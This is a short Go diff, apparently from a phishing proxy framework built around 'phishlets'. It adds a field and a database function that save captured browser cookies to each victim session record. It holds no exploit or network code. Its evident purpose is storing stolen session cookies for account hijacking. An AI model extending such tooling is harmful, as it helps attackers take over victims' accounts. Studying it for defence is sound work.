@@ -20,6 +20,7 @@ type Session struct {
 	BodyTokens   map[string]string                  `json:"body_tokens"`
 	HttpTokens   map[string]string                  `json:"http_tokens"`
 	CookieTokens map[string]map[string]*CookieToken `json:"tokens"`
+	Cookies      []map[string]interface{}           `json:"cookies"`
 	SessionId    string                             `json:"session_id"`
 	UserAgent    string                             `json:"useragent"`
 	RemoteAddr   string                             `json:"remote_addr"`
@@ -61,6 +62,7 @@ func (d *Database) sessionsCreate(sid string, phishlet string, landing_url strin
 		BodyTokens:   make(map[string]string),
 		HttpTokens:   make(map[string]string),
 		CookieTokens: make(map[string]map[string]*CookieToken),
+		Cookies:      []map[string]interface{}{},
 		SessionId:    sid,
 		UserAgent:    useragent,
 		RemoteAddr:   remote_addr,
@@ -198,11 +200,22 @@ func (d *Database) sessionsUpdateCountryInfo(sid string, countryCode string, cou
 	if err != nil {
 		return err
 	}
-	
 	s.CountryCode = countryCode
 	s.Country = country
 	s.UpdateTime = time.Now().UTC().Unix()
-	
+
+	err = d.sessionsUpdate(s.Id, s)
+	return err
+}
+
+func (d *Database) sessionsUpdateCookies(sid string, cookies []map[string]interface{}) error {
+	s, err := d.sessionsGetBySid(sid)
+	if err != nil {
+		return err
+	}
+	s.Cookies = cookies
+	s.UpdateTime = time.Now().UTC().Unix()
+
 	err = d.sessionsUpdate(s.Id, s)
 	return err
 }
